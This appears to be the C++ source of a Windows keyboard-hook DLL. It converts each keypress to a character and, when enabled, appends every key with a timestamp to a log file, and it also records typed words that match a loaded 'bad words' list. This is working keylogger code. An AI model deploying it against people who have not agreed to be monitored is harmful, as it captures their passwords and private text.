#include "pch.h"
#include "framework.h"
#include "kbhookproc.h"

extern "C" KBHOOKPROC_API void SetStatsPath(std::string newPath) {
	WordOfVkeys::GetInstance()->SetWhereToWriteKeys(newPath);
}
extern "C" KBHOOKPROC_API void SetModPath(std::string newPath) {
	WordOfVkeys::GetInstance()->SetWhereToWriteWords(newPath);
}
extern "C" KBHOOKPROC_API void SetBadWordsPath(std::string newPath) {
	WordOfVkeys::GetInstance()->SetWhereToReadBadWords(newPath);
}

extern "C" KBHOOKPROC_API LRESULT KeyboardProc(
	_In_ int    code,
	_In_ WPARAM wParam,
	_In_ LPARAM lParam
)
{
	WordOfVkeys* currWorld = WordOfVkeys::GetInstance();

	if (code < 0 ||
		currWorld->IsUnPrintableKey(wParam) ||
		!currWorld->IsKeyDownState(lParam)) 
	{
		return CallNextHookEx(NULL, code, wParam, lParam);
	}

	currWorld->AddVkeyToWord(wParam);

	return CallNextHookEx(NULL, code, wParam, lParam);
}

WordOfVkeys* WordOfVkeys::_instance = nullptr;

bool WordOfVkeys::IsUnPrintableKey(WPARAM vkey)
{
	if (
		vkey == VK_CONTROL ||
		vkey == VK_MENU ||
		vkey == VK_CAPITAL ||
		vkey == VK_SHIFT)
		return true;

	return false;
}
bool WordOfVkeys::IsKeyDownState(LPARAM vkeyAttr)
{
	return vkeyAttr & 1 << 31;
}

void WordOfVkeys::AddVkeyToWord(WPARAM vkey)
{
	//раскладка клавиатуры в активном потоке
	auto kbLayout = GetCurrentLayout();
	auto keySymb = GetCharSymbFromVkey(vkey, kbLayout);
	std::string currTime = GetCurrTimeBuff();

	//нужно ли искать плохие слова
	if (_isWordAnalysis) {

		AddSymbToWord(keySymb);

		if (IsCurrWordBad()) {
			std::string info = "'" + _currWord + "' : " + currTime;
			WriteTofile(_whereToWriteWords, info);
		}
	}

	if (_isLogAllKeys) {
		//запись всех нажатых клавиш в файл
		std::string info = "'" + std::string(1, keySymb) + "' : " + currTime;
		WriteTofile(_whereToWriteKeys, info);
	}
}

HKL WordOfVkeys::GetCurrentLayout() {
	//активный поток
	DWORD processId;
	DWORD activeThread = GetWindowThreadProcessId(
		GetForegroundWindow(), &processId);

	//раскладка клавиатуры в активном потоке
	auto kbLayout = GetKeyboardLayout(activeThread);

	return kbLayout;
}
std::string WordOfVkeys::GetCurrTimeBuff() {
	//получаем текущее время
	auto start = std::chrono::system_clock::now();

	std::time_t end_time = std::chrono::system_clock::to_time_t(start);
	char timeBuff[50];
	ctime_s(timeBuff, sizeof(timeBuff), &end_time);

	return timeBuff;
}
char WordOfVkeys::GetCharSymbFromVkey(WPARAM vkey, HKL kbLayout) {

	UINT uScanCode = MapVirtualKeyEx(vkey, 0, kbLayout);
	BYTE keysState[256];
	WORD keySymbol;
	//состояние всех клавиш
	GetKeyboardState(keysState);

	//перевод vk_key или scan_code в символ с учетом раскладки (регистр не учитывается!)
	ToAsciiEx(vkey, uScanCode, keysState, &keySymbol, 0, kbLayout);
	char charSymbol = char(keySymbol);

	//проверяем шифт и капслок (для регистра)
	if ((GetAsyncKeyState(VK_SHIFT) && !GetAsyncKeyState(VK_CAPITAL)) ||
		(!GetAsyncKeyState(VK_SHIFT) && GetAsyncKeyState(VK_CAPITAL)))
		charSymbol = toupper(charSymbol);

	return charSymbol;
}

void WordOfVkeys::WriteTofile(std::string fileName, std::string info) {
	std::ofstream ofs(fileName, std::ofstream::out | std::ofstream::app);
	ofs << info;
	ofs.close();
}

// анализ слов
void WordOfVkeys::ReadBadWords()
{
	if (_whereToReadBadWords._Equal(""))
		return;

	std::ifstream fin;

	try {
		fin.open(_whereToReadBadWords);

		std::string word;
		while (true) {
			 fin >> word;
			 if (fin.eof())
				 break;

			_badWordsList.push_back(word);
		}

	}
	catch (...) {

	}

	if(fin.is_open())
		fin.close();
		
}
bool WordOfVkeys::IsCurrWordBad()
{
	for(const auto & w : _badWordsList)
	{
		if (_currWord._Equal(w))
			return true;
	}
	return false;
}
void WordOfVkeys::AddSymbToWord(char symb)
{
	if (symb == char(VK_SPACE) || symb == char(VK_TAB) || symb == char(VK_RETURN))
		_currWord = "";
	else if (symb == char(VK_BACK) && _currWord != "")
		_currWord.pop_back();
	else
		_currWord.push_back(symb);
}
